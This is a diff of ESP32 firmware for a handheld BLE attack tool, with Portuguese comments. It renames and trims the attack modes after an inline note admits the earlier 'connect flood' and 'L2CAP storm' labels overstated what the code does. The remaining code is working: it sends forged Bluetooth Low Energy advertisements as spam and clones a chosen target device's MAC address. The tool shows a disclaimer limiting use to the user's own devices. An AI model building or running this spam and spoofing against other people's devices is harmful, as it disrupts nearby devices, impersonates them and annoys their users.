@@ -35,30 +35,33 @@ struct Target {
 static Target targets[MAX_TARGETS];
 static int    targetCount = 0;
 
+// NOTA DE HONESTIDADE: este módulo NÃO conecta nem "derruba" um dispositivo
+// específico. Ele transmite advertisements BLE forjados (spam) e pode clonar a
+// MAC do alvo. O efeito real é poluir o ar / gerar pop-ups em aparelhos
+// próximos — não é ataque de conexão nem de L2CAP. Os nomes foram ajustados
+// para refletir a realidade. (Um "connect flood" REAL, via BLEClient, é um
+// próximo passo a implementar e TESTAR no hardware.)
 enum AttackMode {
-    ATK_CONNECT_FLOOD = 0,
-    ATK_L2CAP_STORM   = 1,
-    ATK_SPOOF_IDENTITY = 2,
-    ATK_CHAOS         = 3
+    ATK_ADV_FLOOD      = 0,   // spam de advertisements aleatórios (+ bytes da MAC do alvo)
+    ATK_SPOOF_IDENTITY = 1,   // clona a MAC do alvo em advertisements
+    ATK_CHAOS          = 2    // alterna os dois
 };
 
 static const char* ATK_NAMES[] = {
-    "Connect Flood",
-    "L2CAP Ping Storm",
+    "Adv Flood",
     "Spoof Identity",
-    "Chaos (all)"
+    "Chaos (both)"
 };
 static const char* ATK_DESCS[] = {
-    "Fast MAC rotation",
-    "Intensive L2CAP pings",
-    "Clone target advertisem.",
-    "Rotate all 3 attacks"
+    "Random BLE adv spam",
+    "Clone target MAC (adv)",
+    "Alternate both"
 };
-static const int ATK_COUNT = 4;
+static const int ATK_COUNT = 3;
 
 static volatile unsigned long attackPackets = 0;
 static Target activeTarget;
-static AttackMode activeMode = ATK_CONNECT_FLOOD;
+static AttackMode activeMode = ATK_ADV_FLOOD;
 
 // ═══════════════════════════════════════════════════════════════════════════
 //  HELPERS
@@ -106,8 +109,8 @@ static bool showDisclaimer() {
     tft.drawFastHLine(0, 50, 320, UI_SELECT);
 
     int y = 62;
-    drawStringCustom(10, y, "Targets a specific BLE device",   UI_MAIN, 1); y += 12;
-    drawStringCustom(10, y, "to disrupt its operation.",        UI_MAIN, 1); y += 18;
+    drawStringCustom(10, y, "Floods fake BLE ads & spoofs",     UI_MAIN, 1); y += 12;
+    drawStringCustom(10, y, "the target MAC (annoyance).",      UI_MAIN, 1); y += 18;
 
     drawStringCustom(10, y, "Use ONLY on:",                      UI_MAIN, 1); y += 12;
     drawStringCustom(20, y, "- Your own devices",                UI_ACCENT, 1); y += 12;
@@ -397,7 +400,7 @@ static int selectAttackMode(const Target& t) {
 //  · O rádio BLE transmite automaticamente a cada 20-40ms em background
 // ═══════════════════════════════════════════════════════════════════════════
 
-static void updateConnectFloodData(BLEAdvertising* adv) {
+static void updateAdvFloodData(BLEAdvertising* adv) {
     uint8_t packet[31];
     packet[0] = 0x02; packet[1] = 0x01; packet[2] = 0x06;
     packet[3] = 0x07; packet[4] = 0x03;
@@ -405,23 +408,6 @@ static void updateConnectFloodData(BLEAdvertising* adv) {
     packet[10] = activeTarget.macBytes[0];
     packet[11] = activeTarget.macBytes[1];
     packet[12] = activeTarget.macBytes[2];
-
-    BLEAdvertisementData advData;
-    advData.addData(std::string((char*)packet, sizeof(packet)));
-    adv->setAdvertisementData(advData);
-}
-
-static void updateL2CAPStormData(BLEAdvertising* adv) {
-    uint8_t packet[31];
-    packet[0] = 0x1E;
-    packet[1] = 0xFF;
-    packet[2] = 0x5A; packet[3] = 0x5A;
-    packet[4] = 0x01; packet[5] = 0x00;
-    packet[6] = 0x02; packet[7] = 0x00;
-    for (int i = 8; i < 31; i++) packet[i] = (uint8_t)random(0, 256);
-    packet[20] = activeTarget.macBytes[3];
-    packet[21] = activeTarget.macBytes[4];
-    packet[22] = activeTarget.macBytes[5];
 
     BLEAdvertisementData advData;
     advData.addData(std::string((char*)packet, sizeof(packet)));
@@ -442,28 +428,6 @@ static void updateSpoofIdentityData(BLEAdvertising* adv) {
     BLEAdvertisementData advData;
     advData.addData(std::string((char*)packet, sizeof(packet)));
     adv->setAdvertisementData(advData);
-}
-
-// Dispatcher: atualiza os dados do advertisement e gira a MAC
-static void executeAttackTick(BLEAdvertising* adv, AttackMode mode) {
-    AttackMode effective = mode;
-    if (mode == ATK_CHAOS) {
-        effective = (AttackMode)random(0, 3);
-    }
-
-    // Para flood e storm, randomiza a MAC do ESP32 a cada tick
-    if (effective == ATK_CONNECT_FLOOD || effective == ATK_L2CAP_STORM) {
-        randomizeOwnMac();
-    }
-
-    switch (effective) {
-        case ATK_CONNECT_FLOOD:   updateConnectFloodData(adv);    break;
-        case ATK_L2CAP_STORM:     updateL2CAPStormData(adv);      break;
-        case ATK_SPOOF_IDENTITY:  updateSpoofIdentityData(adv);   break;
-        default: break;
-    }
-
-    attackPackets++;
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -507,7 +471,10 @@ static void drawAttackStats(unsigned long elapsed, unsigned long pkts, float rat
     drawStringCustom(90, 138, String(rbuf), TFT_CYAN, 2);
 
     tft.fillRect(12, 172, 296, 12, TFT_BLACK);
-    int fillW = random(40, 290);
+    // barra proporcional ao rate real (não é mais random cosmético)
+    int fillW = (int)(rate * 6.0f);
+    if (fillW < 2)   fillW = 2;
+    if (fillW > 296) fillW = 296;
     tft.fillRect(12, 172, fillW, 12, UI_SELECT);
 }
 
@@ -519,12 +486,11 @@ static void drawAttackStats(unsigned long elapsed, unsigned long pkts, float rat
 static void updateAttackDataOnly(BLEAdvertising* adv, AttackMode mode) {
     AttackMode effective = mode;
     if (mode == ATK_CHAOS) {
-        effective = (AttackMode)random(0, 3);
+        effective = (AttackMode)random(0, 2);
     }
 
     switch (effective) {
-        case ATK_CONNECT_FLOOD:   updateConnectFloodData(adv);    break;
-        case ATK_L2CAP_STORM:     updateL2CAPStormData(adv);      break;
+        case ATK_ADV_FLOOD:       updateAdvFloodData(adv);        break;
         case ATK_SPOOF_IDENTITY:  updateSpoofIdentityData(adv);   break;
         default: break;
     }
